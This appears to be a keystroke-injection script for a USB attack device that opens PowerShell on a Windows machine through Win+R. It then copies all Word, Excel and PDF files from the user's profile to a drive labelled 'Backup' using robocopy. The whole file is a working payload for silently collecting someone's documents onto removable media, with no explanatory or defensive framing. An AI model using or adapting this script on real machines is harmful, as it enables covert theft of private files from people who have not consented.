layout('fr') //set layout us
press("GUI r") // windows + r
delay(500) 
type("powershell\n") // write powershell and press "enter"
delay(1000)
type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'Backup' } | select name\n")
type("robocopy $Env:UserProfile $usbpath.name *.doc *.docx *.xls *.xlsx *.pdf /S /MT /Z\n")
type("exit\n")  //exit